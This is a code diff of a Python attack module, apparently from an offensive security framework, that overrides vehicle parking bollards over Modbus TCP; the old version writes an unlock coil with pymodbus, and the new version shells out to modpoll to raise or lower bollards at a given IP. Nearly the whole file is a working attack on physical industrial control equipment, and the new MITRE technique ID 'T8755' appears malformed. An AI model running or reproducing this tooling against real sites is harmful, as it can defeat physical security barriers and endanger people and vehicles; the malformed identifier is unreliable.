@@ -1,50 +1,50 @@
+#!/usr/bin/env python3
 # modules/attacks/parking_bollard_override.py
 
 import argparse
-from pymodbus.client import ModbusTcpClient
 import json
-import os
+import subprocess
 import time
+import os
 from datetime import datetime
 
-LOG_FILE = "results/bollard_override_log.json"
-MITRE_TTP = "T0856"
+LOG = "results/bollard_override.log"
+ALERT = "webgui/alerts.json"
+MITRE_TTP = "T8755"
 
-def log_action(entry):
+def log_event(message):
     os.makedirs("results", exist_ok=True)
-    if os.path.exists(LOG_FILE):
-        with open(LOG_FILE, "r") as f:
-            data = json.load(f)
-    else:
-        data = []
-    data.append(entry)
-    with open(LOG_FILE, "w") as f:
-        json.dump(data, f, indent=2)
+    with open(LOG, "a") as f:
+        f.write(f"{datetime.utcnow().isoformat()} | {message}\n")
+    print(f"[BOLLARD] {message}")
 
-def override_bollard(ip, port=502, coil_address=0):
-    client = ModbusTcpClient(ip, port=port)
-    if not client.connect():
-        print(f"[!] Connection to {ip}:{port} failed.")
-        return
+def push_alert(msg):
+    os.makedirs("webgui", exist_ok=True)
+    alert = {
+        "agent": "parking_bollard_override",
+        "message": msg,
+        "type": "physical",
+        "timestamp": time.time()
+    }
+    with open(ALERT, "a") as f:
+        f.write(json.dumps(alert) + "\n")
 
-    print(f"[+] Sending override to Modbus coil {coil_address}")
-    client.write_coil(coil_address, True)
-    time.sleep(1)
-    client.close()
-
-    log_action({
-        "timestamp": datetime.utcnow().isoformat(),
-        "target": f"{ip}:{port}",
-        "coil_address": coil_address,
-        "command": "UNLOCK",
-        "ttp": MITRE_TTP
-    })
+def send_modbus_command(action, ip, unit):
+    register = "0x0010"
+    value = "1" if action == "lower" else "0"
+    cmd = f"modpoll -m tcp -t 0 -r {register} -p 502 -a {unit} -1 -c 1 {ip} -v {value}"
+    try:
+        subprocess.run(cmd.split(), check=True)
+        msg = f"Bollard command '{action}' sent to {ip}"
+        log_event(msg)
+        push_alert(msg)
+    except Exception as e:
+        log_event(f"[!] Failed to send Modbus command: {e}")
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Modbus Parking Bollard Override")
-    parser.add_argument("--ip", required=True, help="Target IP address")
-    parser.add_argument("--port", type=int, default=502, help="Modbus TCP port")
-    parser.add_argument("--coil", type=int, default=0, help="Coil address to write TRUE (unlock)")
+    parser = argparse.ArgumentParser(description="Override vehicle bollards via Modbus TCP")
+    parser.add_argument("--action", required=True, choices=["raise", "lower"])
+    parser.add_argument("--ip", required=True, help="Bollard Modbus IP")
+    parser.add_argument("--unit", default="1", help="Modbus unit ID")
     args = parser.parse_args()
-
-    override_bollard(args.ip, args.port, args.coil)
+    send_modbus_command(args.action, args.ip, args.unit)
